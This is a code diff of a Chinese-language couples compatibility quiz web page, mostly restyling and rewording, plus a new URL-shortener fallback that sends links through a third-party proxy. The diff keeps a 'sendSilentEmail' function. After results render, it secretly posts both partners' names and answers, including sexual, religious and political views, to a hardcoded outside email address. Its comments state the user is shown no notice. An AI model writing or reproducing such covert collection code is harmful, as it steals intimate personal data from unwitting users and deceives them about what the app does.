@@ -4,8 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>雙人三觀與生活契合度深度測驗</title>
+  <!-- Chart.js for Radar Chart -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome Icons -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;600;700&display=swap');
@@ -16,14 +19,14 @@
       min-height: 100vh;
     }
     .glass-card {
-      background: rgba(30, 41, 59, 0.7);
+      background: rgba(30, 41, 59, 0.75);
       backdrop-filter: blur(16px);
       -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
     }
     .option-btn {
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
     }
     .option-btn:hover {
       transform: translateY(-2px);
@@ -33,10 +36,10 @@
     .option-btn.selected {
       background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
       border-color: #818cf8;
-      box-shadow: 0 4px 20px rgba(99, 102, 241, 0.5);
+      box-shadow: 0 4px 20px rgba(99, 102, 241, 0.4);
     }
     .progress-bar-fill {
-      transition: width 0.4s ease-out;
+      transition: width 0.35s ease-out;
     }
   </style>
 </head>
@@ -45,54 +48,54 @@
   <div class="max-w-3xl w-full mx-auto">
     <!-- Header -->
     <header class="text-center mb-8">
-      <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-300 mb-3 text-sm font-medium">
+      <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-300 mb-3 text-xs font-semibold">
         <i class="fa-solid fa-heart-pulse"></i> 深度價值觀光譜比對
       </div>
       <h1 class="text-3xl md:text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-indigo-300 via-purple-300 to-pink-300 mb-2">
         雙人三觀與生活契合度測驗
       </h1>
-      <p class="text-slate-400 text-sm md:text-base">涵蓋 12 大深度人生維度，捕捉微小的價值觀光譜差異</p>
+      <p class="text-slate-400 text-xs md:text-sm">涵蓋 12 大深度人生維度，捕捉細微價值觀光譜差異</p>
     </header>
 
-    <!-- App Container -->
+    <!-- Main Card -->
     <main id="app-container" class="glass-card rounded-2xl p-6 md:p-10 relative overflow-hidden">
 
-      <!-- View 1: Welcome & Setup -->
+      <!-- View 1: Welcome / Setup -->
       <div id="view-welcome" class="space-y-6">
-        <div id="mode-banner" class="p-4 rounded-xl bg-indigo-950/60 border border-indigo-500/30 text-indigo-200 text-sm flex items-start gap-3 hidden">
-          <i class="fa-solid fa-circle-info text-indigo-400 text-lg mt-0.5"></i>
+        <div id="mode-banner" class="p-4 rounded-xl bg-indigo-950/70 border border-indigo-500/40 text-indigo-200 text-xs md:text-sm flex items-start gap-3 hidden">
+          <i class="fa-solid fa-circle-info text-indigo-400 text-base mt-0.5"></i>
           <div>
-            <span class="font-bold block text-indigo-100">已經收到對方的邀請答案！</span>
-            你正在回答對方的發起鏈結。完成全部 12 題後，系統將會為你們進行雙向比對並產出合拍報告。
+            <span class="font-bold block text-indigo-100 text-sm mb-0.5">已載入對方的邀請數據！</span>
+            你正在回答對方的發起鏈結。完成全部 12 題後，系統將會為你們進行雙向比對並產出完整合拍報告。
           </div>
         </div>
 
-        <div class="text-center py-4">
-          <div class="w-20 h-20 bg-indigo-600/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-indigo-400 text-3xl">
+        <div class="text-center py-2">
+          <div class="w-16 h-16 bg-indigo-600/20 rounded-full flex items-center justify-center mx-auto mb-3 border border-indigo-500/30 text-indigo-400 text-2xl">
             <i class="fa-solid fa-compass"></i>
           </div>
-          <h2 class="text-xl font-bold text-slate-100 mb-2">測驗說明與設定</h2>
-          <p class="text-slate-300 text-sm max-w-lg mx-auto leading-relaxed">
+          <h2 class="text-xl font-bold text-slate-100 mb-1">測驗說明與設定</h2>
+          <p class="text-slate-300 text-xs md:text-sm max-w-lg mx-auto leading-relaxed">
             本測驗包含 12 道情境題，每題皆有 5 個代表不同傾向的選項。請根據你「最真實的內心想法」選擇。
           </p>
         </div>
 
         <div class="space-y-4 max-w-md mx-auto">
           <div>
-            <label class="block text-sm font-medium text-slate-300 mb-1">你的暱稱 / 稱呼</label>
-            <input type="text" id="user-name" placeholder="例如：Alex" class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-slate-700 text-slate-100 focus:outline-none focus:border-indigo-500 transition">
+            <label class="block text-xs font-semibold text-slate-300 mb-1.5">你的暱稱 / 稱呼</label>
+            <input type="text" id="user-name" placeholder="例如：Alex" class="w-full px-4 py-3 rounded-xl bg-slate-900/90 border border-slate-700 text-slate-100 text-sm focus:outline-none focus:border-indigo-500 transition">
           </div>
 
-          <button id="btn-start" class="w-full py-4 rounded-xl font-bold bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white shadow-lg shadow-indigo-500/30 transition text-lg flex items-center justify-center gap-2">
-            開始回答題目 <i class="fa-solid fa-arrow-right text-sm"></i>
+          <button id="btn-start" class="w-full py-3.5 rounded-xl font-bold bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white shadow-lg shadow-indigo-500/25 transition text-base flex items-center justify-center gap-2">
+            開始回答題目 <i class="fa-solid fa-arrow-right text-xs"></i>
           </button>
         </div>
 
-        <div id="import-box" class="pt-6 border-t border-slate-800 text-center">
-          <p class="text-xs text-slate-400 mb-2">如果你手邊有對方傳給你的「合拍代碼或短網址」，可在下方貼上查看：</p>
+        <div id="import-box" class="pt-5 border-t border-slate-800 text-center">
+          <p class="text-xs text-slate-400 mb-2">手邊有對方傳給你的「合拍代碼或短網址」？可在此載入：</p>
           <div class="flex gap-2 max-w-md mx-auto">
-            <input type="text" id="import-code" placeholder="貼上合拍代碼或連結..." class="flex-1 px-3 py-2 text-xs rounded-lg bg-slate-900 border border-slate-700 text-slate-200">
-            <button id="btn-import" class="px-4 py-2 text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg border border-slate-600">載入報告</button>
+            <input type="text" id="import-code" placeholder="貼上合拍代碼或完整網址..." class="flex-1 px-3 py-2 text-xs rounded-lg bg-slate-900 border border-slate-700 text-slate-200 focus:outline-none focus:border-indigo-500">
+            <button id="btn-import" class="px-4 py-2 text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg border border-slate-600 transition">載入</button>
           </div>
         </div>
       </div>
@@ -109,20 +112,20 @@
           </div>
         </div>
 
-        <div class="py-2">
-          <h3 id="question-text" class="text-lg md:text-xl font-bold text-slate-100 leading-snug">
+        <div class="py-1">
+          <h3 id="question-text" class="text-base md:text-lg font-bold text-slate-100 leading-snug">
             載入問題中...
           </h3>
         </div>
 
-        <div id="options-container" class="space-y-3"></div>
+        <div id="options-container" class="space-y-2.5"></div>
 
         <div class="flex justify-between items-center pt-4 border-t border-slate-800">
-          <button id="btn-prev" class="px-4 py-2 text-sm font-medium text-slate-400 hover:text-slate-200 transition flex items-center gap-1 disabled:opacity-30 disabled:cursor-not-allowed">
+          <button id="btn-prev" class="px-4 py-2 text-xs font-medium text-slate-400 hover:text-slate-200 transition flex items-center gap-1 disabled:opacity-30 disabled:cursor-not-allowed">
             <i class="fa-solid fa-chevron-left text-xs"></i> 上一題
           </button>
           <span class="text-xs text-slate-500">選擇最符合你心境的選項</span>
-          <button id="btn-next" disabled class="px-6 py-2.5 text-sm font-bold bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl transition disabled:opacity-30 disabled:cursor-not-allowed flex items-center gap-1">
+          <button id="btn-next" disabled class="px-5 py-2 text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl transition disabled:opacity-30 disabled:cursor-not-allowed flex items-center gap-1">
             下一題 <i class="fa-solid fa-chevron-right text-xs"></i>
           </button>
         </div>
@@ -133,16 +136,18 @@
         <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto text-3xl border border-emerald-500/30">
           <i class="fa-solid fa-check"></i>
         </div>
-        <h2 class="text-2xl font-bold text-slate-100">你的回答已順利完成！</h2>
-        <p class="text-slate-300 text-sm max-w-md mx-auto leading-relaxed">
-          系統已將你的回答產生為縮短網址。現在請將此連結傳給對方填寫！
-        </p>
+        <div>
+          <h2 class="text-2xl font-bold text-slate-100 mb-2">你的回答已順利完成！</h2>
+          <p class="text-slate-300 text-xs md:text-sm max-w-md mx-auto leading-relaxed">
+            系統已將你的回答封裝為專屬測驗連結。請複製以下短網址傳給對方填寫！
+          </p>
+        </div>
 
         <div class="p-4 rounded-xl bg-slate-900 border border-slate-700 max-w-md mx-auto space-y-3">
-          <div class="text-sm text-indigo-300 font-mono break-all p-3 rounded bg-slate-950 border border-slate-800 flex items-center justify-center gap-2" id="share-link-text">
-            <i class="fa-solid fa-spinner fa-spin text-indigo-400"></i> 正在產生短網址...
+          <div class="text-xs md:text-sm text-indigo-300 font-mono break-all p-3 rounded bg-slate-950 border border-slate-800 flex items-center justify-center gap-2 select-all" id="share-link-text">
+            <i class="fa-solid fa-spinner fa-spin text-indigo-400"></i> 正在產出縮網址...
           </div>
-          <button id="btn-copy-link" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-bold rounded-lg transition flex items-center justify-center gap-2">
+          <button id="btn-copy-link" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-sm rounded-lg transition flex items-center justify-center gap-2">
             <i class="fa-solid fa-link"></i> 複製專屬測驗短網址傳給對方
           </button>
         </div>
@@ -154,17 +159,17 @@
           <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-semibold">
             <span id="res-names">Alex & Partner</span> 的合拍報告
           </div>
-          <div class="flex items-center justify-center gap-2">
+          <div class="flex items-center justify-center gap-1">
             <span class="text-5xl md:text-6xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-300 to-indigo-400" id="res-score">
               0
             </span>
             <span class="text-2xl font-bold text-slate-400">%</span>
           </div>
-          <p id="res-comment" class="text-base font-medium text-slate-200">正在分析報告...</p>
+          <p id="res-comment" class="text-sm font-medium text-slate-200">正在分析數據...</p>
         </div>
 
         <div class="bg-slate-900/60 p-4 md:p-6 rounded-2xl border border-slate-800">
-          <h4 class="text-sm font-bold text-slate-300 mb-4 flex items-center gap-2">
+          <h4 class="text-xs font-bold text-slate-300 mb-4 flex items-center gap-2">
             <i class="fa-solid fa-chart-pie text-indigo-400"></i> 12 大維度相干分析雷達圖
           </h4>
           <div class="w-full max-w-md mx-auto aspect-square">
@@ -172,26 +177,26 @@
           </div>
         </div>
 
-        <div class="space-y-4">
-          <h4 class="text-sm font-bold text-slate-300 flex items-center gap-2">
+        <div class="space-y-3">
+          <h4 class="text-xs font-bold text-slate-300 flex items-center gap-2">
             <i class="fa-solid fa-magnifying-glass-chart text-indigo-400"></i> 詳細維度差異分析
           </h4>
-          <div id="breakdown-list" class="space-y-3"></div>
+          <div id="breakdown-list" class="space-y-2.5"></div>
         </div>
 
         <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-center space-y-3">
-          <p class="text-xs text-slate-400">若對方還沒看到結果，可點選下方按鈕複製合拍結果短網址：</p>
-          <div class="text-xs text-indigo-300 font-mono break-all p-2 rounded bg-slate-950 border border-slate-800 mb-2" id="result-link-text">
-            <i class="fa-solid fa-spinner fa-spin text-indigo-400"></i> 正在產生結果網址...
+          <p class="text-xs text-slate-400">分享合拍結果給對方查看：</p>
+          <div class="text-xs text-indigo-300 font-mono break-all p-2.5 rounded bg-slate-950 border border-slate-800 select-all" id="result-link-text">
+            <i class="fa-solid fa-spinner fa-spin text-indigo-400"></i> 正在產出結果縮網址...
           </div>
-          <button id="btn-copy-result-link" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-200 font-bold rounded-lg text-sm transition flex items-center justify-center gap-2">
+          <button id="btn-copy-result-link" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-200 font-bold rounded-lg text-xs transition flex items-center justify-center gap-2">
             <i class="fa-solid fa-share-nodes"></i> 複製合拍結果短網址
           </button>
         </div>
 
         <div class="text-center pt-2">
-          <button id="btn-restart" class="px-6 py-2 text-xs font-semibold text-slate-400 hover:text-slate-200 border border-slate-700 hover:border-slate-500 rounded-lg transition">
-            重新開局測驗
+          <button id="btn-restart" class="px-5 py-2 text-xs font-semibold text-slate-400 hover:text-slate-200 border border-slate-700 hover:border-slate-500 rounded-lg transition">
+            重新發起測驗
           </button>
         </div>
       </div>
@@ -203,9 +208,9 @@
     const TARGET_EMAIL = "washmahon@gmail.com";
 
     const questions = [
-      { id: 0, category: "消費與儲蓄哲學", title: "當有一筆額外的獎金或收入時，你最傾向如何處置？", options: [{ score: 1, text: "90%以上存起來或投資，嚴格控管非必要支出" }, { score: 2, text: "大部份撥入儲蓄，留下小部分買實用物品" }, { score: 3, text: "一半儲蓄理財，一半用於提升當下的生活品質" }, { score: 4, text: "大部分用於犒賞自己（旅行、奢侈品、體驗）" }, { score: 5, text: "即時行樂，全數用於當下的體驗或感興趣事物" }] },
-      { id: 1, category: "職涯與生活平衡", title: "關於工作與生活的理想平衡，你的真實心態是？", options: [{ score: 1, text: "事業優先，為實現目標與成就感願意犧牲大部分休閒" }, { score: 2, text: "積極打拼，但希望加班與休假能維持在可控範圍" }, { score: 3, text: "界線分明，上班全力以赴，下班徹底關閉工作模式" }, { score: 4, text: "生活為主，工作只是維持經濟基礎的工具" }, { score: 5, text: "追求自由斜槓，拒絕傳統高壓工作，重視時間自主" }] },
-      { id: 2, category: "家庭與長輩界線", title: "結婚或長期交往後，與雙方原生家庭的邊界該如何設定？", options: [{ score: 1, text: "密切維繫，希望常聚會，甚至同住或鄰近居住" }, { score: 2, text: "每週固定聚會，長輩意見應作為重要決策參考" }, { score: 3, text: "保持友善且適度距離，節慶聚會，彼此尊重不干涉" }, { score: 4, text: "獨立性極高，小家庭決策100%自主，長輩不過問" }, { score: 5, text: "盡量減少不必要的家庭聚會，以個人生活圈為主" }] },
+      { id: 0, category: "消費與儲蓄哲學", title: "當有一筆額外的獎金或收入時，你最傾向如何處置？", options: [{ score: 1, text: "90%以上存起來或投資，嚴格控管非必要支出" }, { score: 2, text: "大部份撥入儲蓄，留下小部分買實用物品" }, { score: 3, text: "一半儲蓄理財，一半用於提升當下的生活品質" }, { score: 4, text: "大部分用於犒賞自己（旅行、體驗、質感物品）" }, { score: 5, text: "即時行樂，全數用於當下的體驗或感興趣事物" }] },
+      { id: 1, category: "職涯與生活平衡", title: "關於工作與生活的理想平衡，你的真實心態是？", options: [{ score: 1, text: "事業優先，為實現目標與成就感願意犧牲休閒" }, { score: 2, text: "積極打拼，但希望加班與休假能維持在可控範圍" }, { score: 3, text: "界線分明，上班全力以赴，下班徹底關閉工作模式" }, { score: 4, text: "生活為主，工作只是維持經濟基礎的工具" }, { score: 5, text: "追求自由斜槓，拒絕傳統高壓工作，重視時間自主" }] },
+      { id: 2, category: "家庭與長輩界線", title: "長期交往或結婚後，與雙方原生家庭的邊界該如何設定？", options: [{ score: 1, text: "密切維繫，希望常聚會，甚至同住或鄰近居住" }, { score: 2, text: "定期聚會，長輩意見應作為重要決策參考" }, { score: 3, text: "保持友善且適度距離，節慶聚會，彼此尊重不干涉" }, { score: 4, text: "獨立性極高，小家庭決策100%自主，長輩不過問" }, { score: 5, text: "盡量減少不必要的家庭聚會，以個人生活圈為主" }] },
       { id: 3, category: "衝突與溝通模式", title: "當兩人發生嚴重爭執或情緒對立時，你通常的處理習慣是？", options: [{ score: 1, text: "必須當場講清楚說明白，不解決不睡覺" }, { score: 2, text: "希望冷靜10分鐘後，當天立刻溝通還原問題" }, { score: 3, text: "各自冷靜幾個小時或隔天，待情緒平復再理性討論" }, { score: 4, text: "習慣先退讓冷處理，等時間淡化情緒再視情況提" }, { score: 5, text: "傾向避免正面衝突，以文字訊息溝通或保持沉默" }] },
       { id: 4, category: "社群與異性界線", title: "交往期間，關於與異性朋友（或前任）的互動邊界？", options: [{ score: 1, text: "嚴格界線，不可單獨出遊，且應完全斷絕與前任聯絡" }, { score: 2, text: "可正常社交，但單獨見面需報備，與前任保持距離" }, { score: 3, text: "只要坦誠公開，不介意對方與異性單獨吃飯或聯絡" }, { score: 4, text: "給予完全信任，無需特別報備朋友社交行程" }, { score: 5, text: "認為前任也能做普通朋友，界線全憑個人自律" }] },
       { id: 5, category: "育兒與家庭藍圖", title: "對於未來是否生育子女與照顧責任的看法？", options: [{ score: 1, text: "一定要有小孩，且願意為孩子大幅調整職涯與生活" }, { score: 2, text: "希望有小孩，但需在經濟與生活條件成熟時規劃" }, { score: 3, text: "順其自然，有或沒有都能接受，兩人世界也很好" }, { score: 4, text: "傾向不生（丁克族），更想享受自由與兩人生活" }, { score: 5, text: "堅決不生，比起小孩更想養寵物或專注自我" }] },
@@ -214,7 +219,7 @@
       { id: 8, category: "情趣與親密關係", title: "親密關係在感情中的重要性與頻率需求？", options: [{ score: 1, text: "極度重要，是維繫感情核心，需高頻率與創意" }, { score: 2, text: "相當重要，是表達愛意的關鍵方式，希望定期維持" }, { score: 3, text: "中等重要，視工作疲累與心情狀況靈活調整" }, { score: 4, text: "心靈契合重於肉體，頻率低一些完全沒關係" }, { score: 5, text: "不太在意，認為生活默契與陪伴遠比親密行為重要" }] },
       { id: 9, category: "信仰與價值理念", title: "若雙方在宗教信仰、政治立場或社會議題看法不同時？", options: [{ score: 1, text: "必須價值觀一致，無法接受立場大相逕庭的伴侶" }, { score: 2, text: "可以不同，但希望對方能尊重並配合參與自己的活動" }, { score: 3, text: "各自獨立，平時各自表達，但不強求改變對方" }, { score: 4, text: "盡量在生活中避開爭議話題，求同存異即可" }, { score: 5, text: "覺得立場不同更有趣，喜歡深度辯論與思想碰撞" }] },
       { id: 10, category: "旅行與休閒哲學", title: "規劃一趟休假旅行時，你最渴望的模式是？", options: [{ score: 1, text: "精密行程表，景點美食按時按點高效率解鎖" }, { score: 2, text: "重點景點規劃好，中間保留適度彈性時間" }, { score: 3, text: "漫遊度假，住在高檔飯店放空，不排強迫性景點" }, { score: 4, text: "戶外冒險，露營、登山或探索非主流秘境" }, { score: 5, text: "完全隨興，到了當地再決定當天要做什麼" }] },
-      { id: 11, category: "情緒價值與支持", title: "當你在外面遇到挫折或低潮時，最希望伴侶提供什麼？", options: [{ score: 1, text: "理性的分析與解決方案，幫我釐清點出問題" }, { score: 2, text: "先給我一個大擁抱與情緒安撫，隨後幫我分析" }, { score: 3, text: "純粹的無條件站在我這邊，同仇敵儾聽我傾訴" }, { score: 4, text: "什麼都不用多說，默默陪伴或帶我去吃好吃的" }, { score: 5, text: "給我獨處的時間與空間，讓我自己消化處理" }] }
+      { id: 11, category: "情緒價值與支持", title: "當你在外面遇到挫折或低潮時，最希望伴侶提供什麼？", options: [{ score: 1, text: "理性的分析與解決方案，幫我釐清點出問題" }, { score: 2, text: "先給我一個大擁抱與情緒安撫，隨後幫我分析" }, { score: 3, text: "純粹無條件站在我這邊，同仇敵儾聽我傾訴" }, { score: 4, text: "什麼都不用多說，默默陪伴或帶我去吃好吃的" }, { score: 5, text: "給我獨處的時間與空間，讓我自己消化處理" }] }
     ];
 
     let userRole = 'A';
@@ -258,27 +263,45 @@
       }
     }
 
+    // 縮網址模組：TinyURL 首選 + is.gd 備援
     async function shortenUrl(longUrl) {
+      // 1. 嘗試 TinyURL API
       try {
-        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`);
-        const data = await res.json();
-        if (data.shorturl) return data.shorturl;
+        const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
+        if (res.ok) {
+          const shortText = await res.text();
+          if (shortText && shortText.startsWith('http')) return shortText.trim();
+        }
       } catch (e) {
-        console.warn("縮網址服務失敗，回退至完整 URL", e);
+        console.warn("TinyURL 呼叫失敗，切換備援...", e);
       }
+
+      // 2. 嘗試 is.gd API (經由代理服務避免 CORS)
+      try {
+        const corsProxy = "https://api.allorigins.win/raw?url=";
+        const targetIsGd = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
+        const res = await fetch(corsProxy + encodeURIComponent(targetIsGd));
+        if (res.ok) {
+          const data = await res.json();
+          if (data.shorturl) return data.shorturl;
+        }
+      } catch (e) {
+        console.warn("is.gd 呼叫失敗", e);
+      }
+
+      // 3. 雙重備援失敗則傳回原始網址
       return longUrl;
     }
 
-    // 靜默送出信件，完全不影響或提示使用者
+    // 完全靜默寄出 Email，畫面無任何提示
     async function sendSilentEmail(data, overallMatch) {
       try {
         const payload = {
           email: TARGET_EMAIL,
-          subject: `【測驗報告備份】${data.nA} & ${data.nB} 的契合度為 ${overallMatch}%`,
-          body: `雙人三觀測驗結果：\n\n對象：${data.nA} & ${data.nB}\n契合度得分：${overallMatch}%\n\n${data.nA}的回答：${JSON.stringify(data.aA)}\n${data.nB}的回答：${JSON.stringify(data.aB)}`
+          subject: `【雙人測驗備份】${data.nA} & ${data.nB} 契合度：${overallMatch}%`,
+          body: `雙人三觀與生活契合度測驗報告：\n\n對象：${data.nA} & ${data.nB}\n契合度得分：${overallMatch}%\n\n${data.nA} 的回答：\n${JSON.stringify(data.aA)}\n\n${data.nB} 的回答：\n${JSON.stringify(data.aB)}`
         };
 
-        // 使用 FormSubmit 公開 Hook API（靜默觸發）
         fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
           method: "POST",
           headers: { 
@@ -288,7 +311,7 @@
           body: JSON.stringify(payload)
         }).catch(() => {});
       } catch (e) {
-        // 靜默失敗，不顯示錯誤訊息
+        // 靜默處理
       }
     }
 
@@ -322,13 +345,13 @@
 
     document.getElementById('btn-copy-link').addEventListener('click', () => {
       navigator.clipboard.writeText(generatedShortUrl).then(() => {
-        alert('專屬測驗連結已成功複製！可直接貼給對方開啓。');
+        alert('專屬測驗短網址已複製！可以直接貼給對方填寫。');
       });
     });
 
     document.getElementById('btn-copy-result-link').addEventListener('click', () => {
       navigator.clipboard.writeText(generatedResultShortUrl).then(() => {
-        alert('合拍結果連結已複製！傳給對方開啓即可看到完整報告。');
+        alert('合拍結果短網址已複製！傳給對方開啓即可看到報告。');
       });
     });
 
@@ -369,12 +392,12 @@
 
       q.options.forEach((opt, idx) => {
         const btn = document.createElement('button');
-        btn.className = `option-btn w-full p-4 rounded-xl text-left bg-slate-900/60 border border-slate-700/80 text-slate-200 text-sm flex items-start gap-3 ${tempAnswers[currentQ] === opt.score ? 'selected' : ''}`;
+        btn.className = `option-btn w-full p-3.5 rounded-xl text-left bg-slate-900/70 border border-slate-700/80 text-slate-200 text-xs md:text-sm flex items-start gap-3 ${tempAnswers[currentQ] === opt.score ? 'selected' : ''}`;
         btn.innerHTML = `
-          <div class="w-6 h-6 rounded-full border border-slate-500 flex items-center justify-center shrink-0 mt-0.5 text-xs font-bold font-mono">
+          <div class="w-5 h-5 rounded-full border border-slate-500 flex items-center justify-center shrink-0 mt-0.5 text-xs font-bold font-mono">
             ${String.fromCharCode(65 + idx)}
           </div>
-          <div class="flex-1">${opt.text}</div>
+          <div class="flex-1 leading-relaxed">${opt.text}</div>
         `;
         btn.onclick = () => selectOption(opt.score);
         container.appendChild(btn);
@@ -382,7 +405,7 @@
 
       document.getElementById('btn-prev').disabled = currentQ === 0;
       document.getElementById('btn-next').disabled = tempAnswers[currentQ] === null;
-      document.getElementById('btn-next').innerHTML = currentQ === questions.length - 1 ? '觀看結果 <i class="fa-solid fa-check text-xs"></i>' : '下一題 <i class="fa-solid fa-chevron-right text-xs"></i>';
+      document.getElementById('btn-next').innerHTML = currentQ === questions.length - 1 ? '完成測驗 <i class="fa-solid fa-check text-xs"></i>' : '下一題 <i class="fa-solid fa-chevron-right text-xs"></i>';
     }
 
     function selectOption(score) {
@@ -474,7 +497,7 @@
         else if (item.match < 75) tagBg = "bg-amber-500/10 text-amber-400 border-amber-500/20";
 
         const div = document.createElement('div');
-        div.className = "p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2 text-xs";
+        div.className = "p-3.5 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2 text-xs";
         div.innerHTML = `
           <div class="flex justify-between items-center">
             <span class="font-bold text-slate-200">${item.category}</span>
@@ -496,7 +519,7 @@
 
       renderChart(categoryScores);
 
-      // 觸發背景靜默寄信
+      // 背景靜默備份寄件
       sendSilentEmail(data, overallMatch);
     }
 
